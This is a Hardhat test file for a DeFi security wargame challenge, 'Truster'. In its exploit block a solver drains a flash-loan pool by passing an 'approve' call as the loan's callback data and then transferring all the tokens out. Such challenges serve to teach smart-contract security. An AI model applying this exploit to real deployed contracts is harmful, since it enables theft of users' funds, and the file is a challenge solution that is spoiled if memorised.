const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        /** Exploit analysis
         * I need to take advantage of the contract allowing me to use it as caller.
         * I can call for an unlimited approve to the attacker's address.
         * And I can set the borrower to the contract itself, so the requires will pass,
         * letting the attacker to withdraw the funds later. Alternatively I can
         * borrow 0.
         */
        let calldata, allowanceAfter, allowanceBefore, currentAllowance;
        this.pool = await this.pool.connect(attacker);
        this.token = await this.token.connect(attacker);

        calldata = this.token.interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
        
        allowanceBefore = await this.token.allowance(this.pool.address, attacker.address);
        allowanceBefore = ethers.utils.formatEther(allowanceBefore);

        await this.pool.flashLoan(0, this.pool.address, this.token.address, calldata);
        
        currentAllowance = allowanceAfter = await this.token.allowance(this.pool.address, attacker.address)
        allowanceAfter = ethers.utils.formatEther(allowanceAfter);
        
        // console.log(`Allowance before: ${allowanceBefore}. Allowance after: ${allowanceAfter}.`);

        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

